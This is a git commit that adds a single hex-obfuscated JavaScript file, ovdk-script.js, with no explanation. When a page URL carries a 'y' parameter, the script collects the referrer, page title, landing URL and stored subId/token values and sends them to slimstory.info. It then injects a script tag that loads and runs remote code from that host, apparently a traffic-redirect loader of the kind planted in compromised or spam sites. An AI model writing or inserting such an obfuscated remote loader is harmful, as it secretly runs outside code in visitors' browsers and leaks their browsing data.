2ab7c6f6546584c17749a5414b67ad2190a9d293
ovdik1994 <37517287+ovdik1994@users.noreply.github.com>
2020-09-15 15:16:01 +0300

    Add files via upload

---
+++ ovdk-script.js
@@ -0,0 +1,111 @@
+var _0x99bd = [
+  "\x79",
+  "\x67\x65\x74",
+  "\x73\x65\x61\x72\x63\x68\x50\x61\x72\x61\x6D\x73",
+  "\x68\x72\x65\x66",
+  "\x6C\x6F\x63\x61\x74\x69\x6F\x6E",
+  "\x5F\x79\x4C\x44\x48\x35\x52\x73\x4E\x7A\x51\x64\x72\x54\x58\x4D\x64",
+  "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6C\x69\x6D\x73\x74\x6F\x72\x79\x2E\x69\x6E\x66\x6F\x2F",
+  "",
+  "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x6C\x69\x6D\x73\x74\x6F\x72\x79\x2E\x69\x6E\x66\x6F\x2F\x37\x38\x63\x30\x37\x65\x30\x2F\x70\x6F\x73\x74\x62\x61\x63\x6B",
+  "\x63\x6F\x6E\x66\x69\x67",
+  "\x67\x65\x74\x49\x74\x65\x6D",
+  "\x75\x6E\x64\x65\x66\x69\x6E\x65\x64",
+  "\x70\x61\x72\x73\x65",
+  "\x72\x6F\x75\x6E\x64",
+  "\x63\x72\x65\x61\x74\x65\x64\x5F\x61\x74",
+  "\x74\x74\x6C",
+  "\x73\x75\x62\x49\x64",
+  "\x72\x65\x6D\x6F\x76\x65\x49\x74\x65\x6D",
+  "\x74\x6F\x6B\x65\x6E",
+  "\x3F\x72\x65\x74\x75\x72\x6E\x3D\x6A\x73\x2E\x63\x6C\x69\x65\x6E\x74",
+  "\x26",
+  "\x3F",
+  "\x72\x65\x70\x6C\x61\x63\x65",
+  "\x73\x65\x61\x72\x63\x68",
+  "\x26\x73\x65\x5F\x72\x65\x66\x65\x72\x72\x65\x72\x3D",
+  "\x72\x65\x66\x65\x72\x72\x65\x72",
+  "\x26\x64\x65\x66\x61\x75\x6C\x74\x5F\x6B\x65\x79\x77\x6F\x72\x64\x3D",
+  "\x74\x69\x74\x6C\x65",
+  "\x26\x6C\x61\x6E\x64\x69\x6E\x67\x5F\x75\x72\x6C\x3D",
+  "\x68\x6F\x73\x74\x6E\x61\x6D\x65",
+  "\x70\x61\x74\x68\x6E\x61\x6D\x65",
+  "\x26\x6E\x61\x6D\x65\x3D",
+  "\x26\x68\x6F\x73\x74\x3D",
+  "\x75\x6E\x69\x71\x75\x65",
+  "\x26\x73\x75\x62\x5F\x69\x64\x3D",
+  "\x26\x74\x6F\x6B\x65\x6E\x3D",
+  "\x73\x63\x72\x69\x70\x74",
+  "\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74",
+  "\x74\x79\x70\x65",
+  "\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74",
+  "\x73\x72\x63",
+  "\x52\x5F\x50\x41\x54\x48",
+  "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65",
+  "\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65",
+  "\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65",
+];
+(function () {
+  if (
+    !new URL(window[_0x99bd[4]][_0x99bd[3]])[_0x99bd[2]][_0x99bd[1]](_0x99bd[0])
+  ) {
+    return false;
+  }
+  var _0xbf96x1 = _0x99bd[5];
+  if (!window[_0x99bd[5]]) {
+    window[_0x99bd[5]] = {
+      unique: false,
+      ttl: 86400,
+      R_PATH: `${_0x99bd[6]}${new URL(window[_0x99bd[4]][_0x99bd[3]])[
+        _0x99bd[2]
+      ][_0x99bd[1]](_0x99bd[0])}${_0x99bd[7]}`,
+      P_PATH: _0x99bd[8],
+    };
+  }
+  const _0xbf96x2 = localStorage[_0x99bd[10]](_0x99bd[9]);
+  if (typeof _0xbf96x2 !== _0x99bd[11] && _0xbf96x2 !== null) {
+    var _0xbf96x3 = JSON[_0x99bd[12]](_0xbf96x2);
+    var _0xbf96x4 = Math[_0x99bd[13]](+new Date() / 1000);
+    if (_0xbf96x3[_0x99bd[14]] + window[_0x99bd[5]][_0x99bd[15]] < _0xbf96x4) {
+      localStorage[_0x99bd[17]](_0x99bd[16]);
+      localStorage[_0x99bd[17]](_0x99bd[18]);
+      localStorage[_0x99bd[17]](_0x99bd[9]);
+    }
+  }
+  var _0xbf96x5 = localStorage[_0x99bd[10]](_0x99bd[16]);
+  var _0xbf96x6 = localStorage[_0x99bd[10]](_0x99bd[18]);
+  var _0xbf96x7 = _0x99bd[19];
+  _0xbf96x7 +=
+    _0x99bd[20] +
+    decodeURIComponent(
+      window[_0x99bd[4]][_0x99bd[23]][_0x99bd[22]](_0x99bd[21], _0x99bd[7])
+    );
+  _0xbf96x7 += _0x99bd[24] + encodeURIComponent(document[_0x99bd[25]]);
+  _0xbf96x7 += _0x99bd[26] + encodeURIComponent(document[_0x99bd[27]]);
+  _0xbf96x7 +=
+    _0x99bd[28] +
+    encodeURIComponent(
+      document[_0x99bd[4]][_0x99bd[29]] + document[_0x99bd[4]][_0x99bd[30]]
+    );
+  _0xbf96x7 += _0x99bd[31] + encodeURIComponent(_0xbf96x1);
+  _0xbf96x7 += _0x99bd[32] + encodeURIComponent(window[_0x99bd[5]].R_PATH);
+  if (
+    typeof _0xbf96x5 !== _0x99bd[11] &&
+    _0xbf96x5 &&
+    window[_0x99bd[5]][_0x99bd[33]]
+  ) {
+    _0xbf96x7 += _0x99bd[34] + encodeURIComponent(_0xbf96x5);
+  }
+  if (
+    typeof _0xbf96x6 !== _0x99bd[11] &&
+    _0xbf96x6 &&
+    window[_0x99bd[5]][_0x99bd[33]]
+  ) {
+    _0xbf96x7 += _0x99bd[35] + encodeURIComponent(_0xbf96x6);
+  }
+  var _0xbf96x8 = document[_0x99bd[37]](_0x99bd[36]);
+  _0xbf96x8[_0x99bd[38]] = _0x99bd[39];
+  _0xbf96x8[_0x99bd[40]] = window[_0x99bd[5]][_0x99bd[41]] + _0xbf96x7;
+  var _0xbf96x9 = document[_0x99bd[42]](_0x99bd[36])[0];
+  _0xbf96x9[_0x99bd[44]][_0x99bd[43]](_0xbf96x8, _0xbf96x9);
+})();
